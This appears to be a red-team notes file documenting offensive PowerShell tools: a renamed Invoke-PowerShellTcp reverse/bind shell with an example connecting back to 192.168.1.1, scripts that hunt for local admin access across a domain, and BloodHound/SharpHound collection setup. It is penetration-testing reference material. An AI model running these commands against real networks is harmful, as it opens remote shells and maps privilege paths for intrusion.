## Interesting Tools

### `Invoke-PowerShellTcp.ps1`
---
Opens a shell. Modified Version of the original `Invoke-PowerShellTcp_Old.ps1`. Replacing the main function name to `Power`.

Parameters:
- `Reverse`: To open reverse shell
- `Bind` : Creates a bind shell
- `IPAddress`
- `Port`

Example:
```powershell
C:> . Invoke-PowerShellTcp.ps1      
C:> Power -Reverse -IPAddress 192.168.1.1 -Port 1111
```

### `Find-PSRemotingLocalAdminAccess.ps1`
---
To search for local admin access on machines in a domain or local network for the current user.
Parameters:
- `ComputerFile`: File with computers to check
- `StopOnSuccess`: Stops when found one
Example:
```powershell
PS C:> . .\Find-PSRemotingLocalAdminAccess.ps1       # Import module
PS C:> Find-PSRemotingLocalAdminAccess               # Run the function
COMPUTER-WITH-ACCESS
PS C:>
```
### `Find-WMILocalAdminAccess.ps1`
---
Runs a WMI command against the sepcified list of computers. Since, by-default, we need local administrative access on a computer to run WMI commands, a success for this fucntions means local administrative access.

parameters: Same as previous tool
```powershell
PS C:> . .\Find-WMILocalAdminAccess.ps1
PS C:> Find-WMILocalAdminAccess
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA544
Version         : 10.0.14393
The current user has Local Admin access on: SERVER.domain.local
SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA549
Version         : 10.0.14393
The current user has Local Admin access on: COMPUTER.domain.local
PS C:>
```

### BloodHound
---

Setup:
- Install and run neo4j:
```powershell
C:> neo4j.bat install-service
C:> neo4j.bat start
```
- Go to http://localhost:7474 and log using `neo4j` and `neo4j`.
- Change the password for `neo4j` user to the desireed one
- Run `BloodHound.exe` from `BloodHound-win32-x64`
- Will ask for credentials: bolt://localhost:7687  -  neo4j  -  PASSWORD

Run Collectors:

- Powershell:
```powershell
C:> . .\SharpHound.ps1
C:> Invoke-BloodHound -CollectionMethod All -Verbose
```
